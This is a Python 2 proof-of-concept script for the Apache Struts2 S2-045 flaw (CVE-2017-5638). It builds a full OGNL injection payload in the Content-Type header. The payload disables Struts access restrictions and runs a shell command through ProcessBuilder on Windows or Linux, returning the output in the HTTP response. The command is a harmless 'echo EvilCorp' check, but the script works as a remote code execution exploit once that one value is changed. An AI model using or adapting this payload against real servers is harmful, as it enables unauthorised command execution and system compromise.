#!/usr/bin/env python
#__author__ == 'Kios'
#__Email__ == 'root@mkernel.com'

import urllib2
import httplib

class PoC(object):
    '''
    CVE-2017-5638 Struct2 S2-045 Proof of Concept
    '''
    def __init__(self, url):
        '''
        Initialize
        '''
        self.url = url
        self.cmd = 'echo EvilCorp'
        
    def _generatePayload(self):
        '''
        Generate Payload.
        '''
        payload = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % self.cmd
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"
        
        return payload
    
    def run(self):
        '''
        S2-045 Check!
        '''
        payload = self._generatePayload()
        url = self.url
        try:
            headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
            request = urllib2.Request(url, headers=headers)
            page = urllib2.urlopen(request).read()
        except httplib.IncompleteRead, e:
            page = e.partial
            
        if "EvilCorp" in page:
            print("Site is vulnerable with S2-045!")
        else:
            print("Site is not Vulnerable!")
            
if __name__ == '__main__':
    obj1 = PoC('http://192.168.0.104/memoshow.action?id=3')
    obj1.run()